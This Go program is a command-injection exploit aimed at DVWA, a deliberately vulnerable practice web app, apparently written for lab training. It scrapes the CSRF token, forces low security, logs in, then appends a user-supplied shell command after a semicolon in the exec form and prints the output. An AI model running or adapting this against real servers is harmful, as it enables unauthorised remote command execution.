=package main

import (
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"strings"
)

//Login ...
func Login(user, pass, site string) string {

	req, _ := http.Get(site + "/login.php")
	body, _ := ioutil.ReadAll(req.Body)
	csrf := string(body)
	csrfIndex := strings.Index(csrf, "value='")
	csrfFinal := (csrf[csrfIndex+7 : csrfIndex+39])

	cookies := strings.Join(req.Header["Set-Cookie"], "")
	cookieIndexOne := strings.Index(cookies, "PHPSESSID")
	cookieIndexTwo := strings.Index(cookies, ";")
	cookieFinal := "security=low;" + (cookies[cookieIndexOne:cookieIndexTwo])

	client := &http.Client{}
	formData := strings.NewReader("username=" + user + "&password=" + pass + "&Login=Login&user_token=" + csrfFinal)
	reqL, _ := http.NewRequest("POST", site+"/login.php", formData)
	reqL.Header.Set("Cookie", cookieFinal)
	reqL.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	client.Do(reqL)

	return cookieFinal
}

//Commands ...
func commands() int {
	if len(os.Args) <= 4 {
		fmt.Println("Usage...\n exploit.exe http://site/DVWA_DIR username password command")
		return 0
	}
	var site = os.Args[1]
	var user = os.Args[2]
	var pass = os.Args[3]
	var cmd = os.Args[4]
	var cookies = Login(user, pass, site)

	client := &http.Client{}

	formData := strings.NewReader("ip=%3B" + cmd + "&Submit=Submit")
	req, _ := http.NewRequest("POST", site+"/vulnerabilities/exec/", formData)
	req.Header.Set("Cookie", cookies)
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	resp, _ := client.Do(req)

	body, _ := ioutil.ReadAll(resp.Body)
	result := string(body)
	preOne := strings.Index(result, "<pre>")
	preTwo := strings.Index(result, "</pre>")
	fmt.Println(result[preOne+5 : preTwo])
	return 0
}

func main() {
	commands()
}
